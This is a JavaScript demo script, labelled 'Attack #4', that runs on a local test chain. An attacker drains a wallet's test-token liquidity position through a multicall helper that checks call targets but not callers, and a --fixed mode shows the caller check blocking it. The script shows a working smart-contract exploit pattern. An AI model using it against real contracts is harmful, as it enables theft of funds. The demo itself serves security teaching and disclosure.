// Attack #4: a helper anyone can drive. Our wallet's liquidity module may only be called by its
// keeper helper. The helper's public multicall checks what you call, not who you are.
//   node demos/04-multicall.mjs           target check only: the position moves to the attacker
//   node demos/04-multicall.mjs --fixed   caller check: reverts NotKeeper
import { encodeFunctionData } from "viem";
import { startChain, stopChains, roles, abis, units, fmt, short } from "../lib/chain.mjs";
import { session } from "../lib/term.mjs";

const fixed = process.argv.includes("--fixed");
const t = session(fixed ? "multicall-fixed" : "multicall", fixed ? "A helper anyone can drive, fixed" : "A helper anyone can drive");
const C = await startChain();
const A = roles.attacker;

const rseth = await C.deploy("token", ["Test rsETH", "tRSETH", 18]);
const wallet = await C.deploy("wallet");
// --fixed only picks which helper contract is deployed.
const helper = await C.deploy(fixed ? "helperFixed" : "helper");
const habi = fixed ? abis.helperFixed : abis.helper;
const module = await C.deploy("module", [wallet, rseth, helper]);
await C.send(roles.deployer, wallet, abis.wallet, "enableModule", [module]);
await C.send(roles.deployer, helper, habi, "approveTarget", [module]);
await C.send(roles.deployer, helper, habi, "addKeeper", [roles.keeper.address]);
await C.fund(rseth, wallet, units(2_900));

const pos = async () => fmt(await C.balanceOf(rseth, wallet));
t.say(`wallet LP position: ${await pos()} tRSETH · module enabled · helper authorized on the module`);
t.note(`attacker is a keeper: ${await C.read(helper, habi, "isKeeper", [A.address]) ? "yes" : "no"} · module is an approved target: yes`);
const data = encodeFunctionData({ abi: abis.module, functionName: "moveLiquidity", args: [A.address] });
t.cmd(`attacker → helper.multicall([module.moveLiquidity(${short(A.address)})])`);
const r = await C.attempt(A, helper, habi, "multicall", [[{ target: module, data }]]);
if (r.ok) t.bad(`  ✓ accepted`); else t.ok(`  ✗ reverted: ${r.name}`);
const got = await C.balanceOf(rseth, A.address);
(got > 0n ? t.bad : t.ok)(`  wallet position 2,900 → ${await pos()} tRSETH · attacker ${fmt(got)}`);
t.big(got > 0n ? `ONE MULTICALL · WALLET 2,900 → ${await pos()} tRSETH` : `REVERTED · WALLET KEEPS ${await pos()} tRSETH`);
t.save(); stopChains(); process.exit(0);
